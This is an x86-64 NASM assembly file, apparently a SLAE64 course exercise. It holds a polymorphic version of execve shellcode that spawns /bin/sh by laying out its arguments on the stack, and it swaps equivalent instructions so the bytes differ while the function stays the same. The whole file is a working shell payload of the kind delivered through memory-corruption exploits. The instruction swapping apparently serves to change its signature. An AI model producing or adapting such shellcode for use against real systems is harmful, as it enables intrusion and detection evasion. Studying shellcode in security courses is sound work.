; File: execve-stack-poly.nasm
; Author: Kevin Ren, originally professor Viviek of SLAE64
; Purpose: shellcode a execve shellcode to spawn a shell using the stack method, 
; 		using polymorphism, changing up instructions but with the same functionalities


global _start

section .text
_start: 
	; zero out registers
	; xor rax, rax
	mov rax, rbx
	sub rax, rbx
	
	xor rbx, rbx

	; execve syscall (#59)
	mov al, 59		
	
	; execve arguments
	;push rbx					; pushing NULL (zeros)
	mov qword [rsp - 8], rbx
	sub rsp, 0x8	

	mov rcx, 0x68732f2f6e69622f			; pushing /bin//sh in reverse hex
	;mov rcx,  0x57621e1e5d58511e
	;add rcx,  0x1111111111111111

	push rcx 
	mov rdi, rsp					; filename /bin//sh (1st arg)

	;push rbx					; pushing NULL
	;push rdi					; push address of /bin//sh00000000

	mov qword [rsp - 8], rbx
	mov qword [rsp - 16], rdi
	sub rsp, 16

	mov rsi, rsp					; argv[/bin//sh00000000, 00000000] (2nd arg)

	push rbx					; pushing NULL
	mov rdx, rsp					; envp[00000000] (3rd arg)

	; NOTE: could have just pushed NULL, /bin//sh [first arg], NULL [third arg], /bin//shNULL (first arg) [second arg]

	syscall
